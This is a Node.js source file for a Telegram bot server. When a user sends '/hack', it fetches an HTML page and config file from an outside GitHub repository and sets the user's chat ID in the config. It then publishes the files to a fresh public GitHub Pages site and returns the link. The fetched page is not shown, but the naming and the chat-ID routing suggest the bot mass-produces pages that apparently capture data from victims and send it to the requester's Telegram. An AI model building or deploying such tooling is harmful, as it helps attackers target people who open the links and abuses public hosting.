const express = require("express");
const TelegramBot = require("node-telegram-bot-api");
const { Octokit } = require("@octokit/rest");
const axios = require("axios");

// Setup for bot and GitHub credentials
const botToken = process.env.TELEGRAM_BOT_TOKEN;
const bot = new TelegramBot(botToken, { polling: false });

const githubToken = process.env.GITHUB_TOKEN;
const githubUsername = process.env.GITHUB_USERNAME;

const octokit = new Octokit({ auth: githubToken });

const app = express();
app.use(express.json());

// Webhook endpoint for Telegram bot
app.post("/", async (req, res) => {
  const msg = req.body;
  const chatId = msg?.chat?.id;

  if (!chatId) {
    return res.status(400).send("Invalid request format.");
  }

  try {
    if (msg.text === "/hack") {
      // Fetch files from GitHub
      const [indexHtmlResponse, configJsResponse] = await Promise.all([
        axios.get("https://raw.githubusercontent.com/DEXTER-ID-NEW/Ashodow-a-pattio/gh-pages/index.html"),
        axios.get("https://raw.githubusercontent.com/DEXTER-ID-NEW/Ashodow-a-pattio/gh-pages/config.js"),
      ]);

      const indexContent = indexHtmlResponse.data;
      let configContent = configJsResponse.data;

      // Replace chatId in config.js
      configContent = configContent.replace(/chatId: "\d+"/, `chatId: "${chatId}"`);

      // Generate a unique GitHub repo name
      const repoName = `DEXTER_ID_${Date.now().toString(36)}`;

      // Create the repo on GitHub
      const repoResponse = await octokit.repos.createForAuthenticatedUser({
        name: repoName,
        private: false,
      });

      const repoUrl = repoResponse.data.html_url;

      // Add files to the new repository
      const files = [
        { path: "index.html", content: indexContent },
        { path: "config.js", content: configContent },
      ];

      for (const file of files) {
        await octokit.repos.createOrUpdateFileContents({
          owner: githubUsername,
          repo: repoName,
          path: file.path,
          message: `Added ${file.path}`,
          content: Buffer.from(file.content).toString("base64"),
        });
      }

      const githubPageUrl = `https://${githubUsername}.github.io/${repoName}/index.html`;
      await bot.sendMessage(chatId, `🎉 Files uploaded successfully!\nGitHub Repo: ${repoUrl}\nGitHub Page: ${githubPageUrl}`);

      res.status(200).send("OK");
    } else {
      res.status(400).send("Invalid command.");
    }
  } catch (error) {
    console.error("Error:", error.message);
    bot.sendMessage(chatId, `❌ An error occurred: ${error.message}`);
    res.status(500).send("An error occurred while processing the command.");
  }
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
